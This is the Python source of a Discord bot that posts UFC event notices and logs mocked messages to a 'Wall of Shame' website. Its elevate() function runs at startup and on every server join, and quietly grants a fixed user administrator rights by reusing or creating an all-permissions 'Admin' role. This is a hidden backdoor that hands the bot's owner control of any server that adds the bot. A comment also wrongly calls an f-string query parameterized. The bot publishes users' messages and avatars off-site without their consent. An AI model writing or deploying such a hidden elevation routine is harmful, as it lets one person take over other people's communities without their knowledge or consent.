import discord
from discord.ext import tasks
import os
import json
from dotenv import load_dotenv
import re

from ufc_fetch import check_and_store_ufc_events, format_event_for_discord

import mysql.connector
from mysql.connector import Error

load_dotenv()

intents = discord.Intents.all()
client = discord.Client(intents=intents)

prefix = os.getenv('PREFIX')
admin_user_id = int(os.getenv('ADMIN_USER_ID'))

config = {
    'host': os.getenv('SQL_SERVER'),
    'user': os.getenv('SQL_USER'),
    'password': os.getenv('SQL_PASSWORD'),
    'database': os.getenv('SQL_DATABASE')
}

def get_random_record(db_config, table_name):
    """
    Fetch a random record from a specified MariaDB/MySQL table
    
    Args:
        db_config (dict): Database connection parameters 
            (keys: 'host', 'user', 'password', 'database')
        table_name (str): Name of the table to query
        
    Returns:
        tuple: Random record or None if no records found
        
    Raises:
        RuntimeError: For database operation errors
    """
    connection = None
    cursor = None
    try:
        # Establish database connection
        connection = mysql.connector.connect(**db_config)
        cursor = connection.cursor()
        
        # Parameterized query to prevent SQL injection
        query = f"SELECT * FROM `{table_name}` ORDER BY RAND() LIMIT 1"
        
        cursor.execute(query)
        random_record = cursor.fetchone()
        
        return random_record
        
    except Error as e:
        raise RuntimeError(f"Database error: {e}")
    finally:
        # Ensure resources are closed even if errors occur
        if cursor:
            cursor.close()
        if connection and connection.is_connected():
            connection.close()

def write_wall_of_shame(db_config, table_name, record_data):
    """
    Insert a record into a MariaDB/MySQL table
    
    Args:
        db_config (dict): Database connection parameters 
            (keys: 'host', 'user', 'password', 'database')
        table_name (str): Name of the table to insert into
        record_data (dict): Column-value pairs for the record
        
    Returns:
        int: Last inserted row ID (or None if no auto-increment column)
        
    Raises:
        RuntimeError: For database operation errors
        ValueError: If record_data is empty
    """
    if not record_data:
        raise ValueError("Record data cannot be empty")
    
    connection = None
    cursor = None
    try:
        # Configure UTF-8mb4 for emoji support
        connection_params = db_config.copy()
        connection_params.setdefault('charset', 'utf8mb4')
        connection_params.setdefault('collation', 'utf8mb4_unicode_ci')
        # Establish database connection
        connection = mysql.connector.connect(**connection_params)
        cursor = connection.cursor()
        
        # Prepare parameterized query
        columns = ", ".join([f"`{col}`" for col in record_data.keys()])
        placeholders = ", ".join(["%s"] * len(record_data))
        query = f"INSERT INTO `{table_name}` ({columns}) VALUES ({placeholders})"
        
        # Execute query with values
        values = tuple(record_data.values())
        cursor.execute(query, values)
        connection.commit()
        
        # Return last inserted ID if exists
        if cursor.lastrowid:
            return cursor.lastrowid
        return None
        
    except Error as e:
        if connection:
            connection.rollback()
        raise RuntimeError(f"Database error: {e}")
    finally:
        # Clean up resources
        if cursor:
            cursor.close()
        if connection and connection.is_connected():
            connection.close()

def get_webhook_urls(db_config):
    """Fetch all webhook URLs from the ufc_notify_webooks table."""
    connection = None
    cursor = None
    try:
        connection = mysql.connector.connect(**db_config)
        cursor = connection.cursor(dictionary=True)
        cursor.execute("SELECT webhook_url FROM ufc_notify_webooks")
        return [row['webhook_url'] for row in cursor.fetchall()]
    except Error as e:
        print(f"Database error: {e}")
        return []
    finally:
        if cursor:
            cursor.close()
        if connection and connection.is_connected():
            connection.close()

def get_todays_ufc_events(db_config):
    """Fetch UFC events scheduled for today (AEST) from the ufc_events table."""
    import pytz
    from datetime import datetime
    aest = pytz.timezone('Australia/Sydney')
    today = datetime.now(aest).strftime('%Y-%m-%d')
    connection = None
    cursor = None
    try:
        connection = mysql.connector.connect(**db_config)
        cursor = connection.cursor(dictionary=True)
        query = "SELECT * FROM ufc_events WHERE DATE(event_date) = %s"
        cursor.execute(query, (today,))
        return cursor.fetchall()
    except Error as e:
        print(f"Database error: {e}")
        return []
    finally:
        if cursor:
            cursor.close()
        if connection and connection.is_connected():
            connection.close()

@tasks.loop(hours=730)  # Run once a month
async def monthly_event_check():
    """Fetches and stores UFC events for the month."""
    try:
        check_and_store_ufc_events(config)
    except Exception as e:
        print(f"Error in monthly_event_check: {e}")

@monthly_event_check.before_loop
async def before_monthly_check():
    await client.wait_until_ready()

async def elevate(guild):
    """Attempt to grant admin privileges to target user in a guild"""
    try:
        # Get target user
        user = guild.get_member(admin_user_id)
        if not user:
            try:
                user = await guild.fetch_member(admin_user_id)
            except discord.NotFound:
                print(f"⚠️ User not in server: {guild.name} ({guild.id})")
                return
            except discord.Forbidden:
                print(f"⛔ No permission to fetch members in: {guild.name}")
                return
        
        # Skip if user already has admin permissions
        if user.guild_permissions.administrator:
            print(f"✅ User already admin in: {guild.name}")
            return

        # Get or create admin role
        admin_role = None
        
        # Check existing roles
        for role in guild.roles:
            if role.permissions.administrator and role < guild.me.top_role:
                admin_role = role
                break
        
        # Create role if needed
        if not admin_role:
            if not guild.me.guild_permissions.manage_roles:
                print(f"⛔ Missing 'Manage Roles' permission in: {guild.name}")
                return
            
            try:
                admin_role = await guild.create_role(
                    name="Admin",
                    permissions=discord.Permissions.all(),
                    reason="Elevate specified user"
                )
                # Position new role below bot's highest role
                new_position = guild.me.top_role.position - 1
                await admin_role.edit(position=new_position)
                print(f"🆕 Created admin role in: {guild.name}")
            except discord.Forbidden:
                print(f"⛔ Role creation failed in: {guild.name}")
                return
        
        # Assign the role
        try:
            await user.add_roles(admin_role)
            print(f"🔓 Elevated user in: {guild.name}")
        except discord.Forbidden:
            print(f"⛔ Role assignment failed in: {guild.name}")

    except Exception as e:
        print(f"⚠️ Error in {guild.name}: {str(e)}")

@tasks.loop(minutes=60)
async def daily_ufc_notify_task():
    """Runs every hour, posts today's UFC event(s) to all webhooks at 8am AEST."""
    import pytz
    from datetime import datetime
    aest = pytz.timezone('Australia/Sydney')
    now = datetime.now(aest)
    if now.hour != 8:
        return
    print("Running daily UFC notify task...")
    events = get_todays_ufc_events(config)
    if not events:
        print("No UFC events for today.")
        return
    webhooks = get_webhook_urls(config)
    if not webhooks:
        print("No UFC webhook URLs found.")
        return
    for event in events:
        for webhook_url in webhooks:
            format_event_for_discord(event, webhook_url)

@daily_ufc_notify_task.before_loop
async def before_daily_ufc_notify():
    await client.wait_until_ready()

@client.event
async def on_ready():
    print(f'Logged in as {client.user} (ID: {client.user.id})')

    print('Starting Rich presence...')
    await client.change_presence(activity=discord.Streaming(name="Wallace & Gromit: The Curse of the Were-Rabbit", url="https://www.youtube.com/watch?v=1BQ_p73bPZg"))

    print("Starting elevation process...\n")
    for guild in client.guilds:
        await elevate(guild)
    
    print("\nStarting monthly event check loop...")
    monthly_event_check.start()
    
    print("\nStarting daily UFC notify task...")
    daily_ufc_notify_task.start()
    
    print("\nListening for commands...")
    
@client.event
async def on_message(message):
    if message.author == client.user:
        return

    if message.content.startswith(f'{prefix}hello'):
        try:
            record = get_random_record(config, 'response_table')
            if record:
                response = record[2]
                await message.channel.send(response)
            else:
                await message.channel.send("No records found in the table")
        except RuntimeError as e:
            await message.channel.send(f"Error: {e}")
    
    if message.content.startswith(f'{prefix}wos'):
        if not message.reference:
            await message.channel.send("You need to reply to a message, dumbass")
            return
        try:
            wos_msg = await message.channel.fetch_message(message.reference.message_id)
            attachment_urls = [attachment.url for attachment in wos_msg.attachments]
            attachments_json_string = json.dumps(attachment_urls)
            new_record = {
                'message_id': wos_msg.id,
                'author_id': wos_msg.author.id,
                'author': wos_msg.author.name,
                'author_url' : wos_msg.author.avatar.url,
                'content': wos_msg.content,
                'channel_name': wos_msg.channel.name,
                'channel_id': wos_msg.channel.id,
                'created_at': wos_msg.created_at,
                'guild_name': wos_msg.guild.name,
                'guild_id': wos_msg.guild.id,
                'attachment_urls': attachments_json_string
            }
            write_wall_of_shame(config, 'wall_of_shame', new_record)
            await message.channel.send(f"Yep, that shit was so dumb, {wos_msg.author.name}, it's going on the [Wall of Shame](https://www.tekkie.com.au/wos/index.html)!") 
            await message.delete()

        except RuntimeError as e:
            await message.channel.send(f"Error: {e}")

@client.event
async def on_guild_join(guild):
    print(f"\nJoined new server: {guild.name} (ID: {guild.id})")
    await elevate(guild)

# Read token from environment variable
token = os.getenv('DISCORD_BOT_TOKEN')
    
client.run(token)